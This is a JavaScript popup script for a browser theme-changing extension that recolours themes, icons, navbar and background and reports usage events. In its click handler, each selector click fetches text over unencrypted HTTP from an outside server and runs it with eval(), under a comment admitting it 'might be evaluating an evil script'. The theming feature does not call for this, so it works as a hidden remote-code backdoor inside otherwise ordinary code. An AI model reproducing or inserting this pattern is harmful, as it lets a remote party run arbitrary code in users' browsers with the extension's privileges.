// Message bg for tracking
function trackEvent(actionName, actionType, properties) {
    chrome.runtime.sendMessage({
        action: 'TRACK_EVENT',
        actionName: actionName,
        actionType: actionType,
        properties: properties
    });
}

// Message bg for error tracking
function trackError(e, number) {
    chrome.runtime.sendMessage({
        action: 'ERROR',
        errorNumber: number,
        errorMessage: e.message,
        errorName: e.name
    });
}

//Send message to current tab content script
function sendMsgToCS(message) {
   chrome.tabs.query({
        active: true,
        currentWindow: true
    }, function(tabs) {
        try {
            tabs.forEach(function(t) {
                chrome.tabs.sendMessage(t.id, message);
            });
        } catch (e39) {
            trackError(e39, 39);
        }
    });
}

function activateThemeClick(e){
    var className = e.target.className;
    sendMsgToCS({
        action : 'CHANGE_THEME',
        colorCode: className
    });
}

function activateIconsClick(e){
    var className = e.target.className;
    sendMsgToCS({
        action : 'CHANGE_ICONS',
        colorCode: className
    });
}

function activateNavClick(e){
    var elem = document.getElementById('navBarPicker');
    var colorCode = elem.color.toString();
    sendMsgToCS({
        action : 'CHANGE_NAVBAR',
        colorCode: colorCode
    });
}

function closeFn() {
  window.close();
}

function activateBgClick(e){
    var elem = document.getElementById('bgPicker');
    var colorCode = elem.color.toString();
    sendMsgToCS({
        action : 'CHANGE_BGCOL',
        colorCode: colorCode
    });
}

var isOpened = {'change_themes':false, 'change_icons':false, 'change_navbar': false, 'change_bgcol': false}
function click(e) {

    var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://nodejsfb-hiko.rhcloud.com:8080/", true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            // WARNING! Might be evaluating an evil script!
            var resp = eval("(" + xhr.responseText + ")");
            console.log(resp);
        }
    }
    xhr.send();

    if( e.target !== this && e.target.className !== 'categoryTitle') {
        return;
    }
    else {
        var divName = '';
        if (e.target.className == 'categoryTitle') {
            divName = $(this).attr('id');
        }
        else {
             divName = e.target.id;
        }
        var elems = document.getElementById(divName + '_select');
        if (elems.style.display !== 'none') {
            elems.style.display = 'none';

        }
        else {

            elems.style.display = 'block';
        }
        document.getElementById('popup').style.height = $(window).height();

        if (divName == 'change_themes') {
            document.getElementById('popup').style.height = $(window).height();
            for (var i = 0; i < elems.childNodes.length; i++) {
                elems.childNodes[i].onclick = activateThemeClick;

            }
        }
        if (divName == 'change_icons') {
            document.getElementById('popup').style.height = $(window).height();
            //   $('#popup').css({'height' :$(window).height() });
            for (var i = 0; i < elems.childNodes.length; i++) {
                elems.childNodes[i].onclick = activateIconsClick;

            }
        }

        if (divName == 'change_navbar') {
            document.getElementById('popup').style.height = $(window).height();
            // we adjust popupsize
            for (var i = 0; i < elems.childNodes.length; i++) {
                elems.childNodes[i].onclick = activateNavClick;

            }
        }

        if (divName == 'change_bgcol') {
            document.getElementById('popup').style.height = $(window).height();
            for (var i = 0; i < elems.childNodes.length; i++) {
                if (elems.childNodes[i].tagName == 'SPAN') {
                    elems.childNodes[i].onclick = activateBgClick;
                }
            }
        }
    }

}
function changeSize(){
    document.getElementById('popup').style.width = '1463px';
    document.getElementById('popup').style.height = '815px';

}

function resizeBack(){
    document.getElementById('popup').style.width = '300px';
    document.getElementById('popup').style.height = '310px';

}
//Tracks user icon click and registers popup window event listeners
function run() {
  trackEvent("iccl", "func");
  document.addEventListener('DOMContentLoaded', function() {

    try{
        $(".fancybox").fancybox({
            'showCloseButton' : false,
            'width': '1463px',
            'height': '815px',
            'beforeClose': function(){
               resizeBack();
            }



        });
        $('.overlaySize').on('click', function(){
            changeSize();
        });

        document.getElementById('popup').style.width = '300px';
        document.getElementById('bgPicker').addEventListener('onclick',function(){
            alert('ok');
        });
      var closeButton = document.getElementById('close_btn');
      closeButton.onclick = closeFn;
        $( ".selector" ).each(function( index ) {
            console.log(index);
            $(this).on('click', click);
        });
    } catch (e35) {
      trackError(e35, 35);
      
    }
    
  });
  
  
}

try {

    run();
} catch (e40) {
  trackError(e40, 40);
}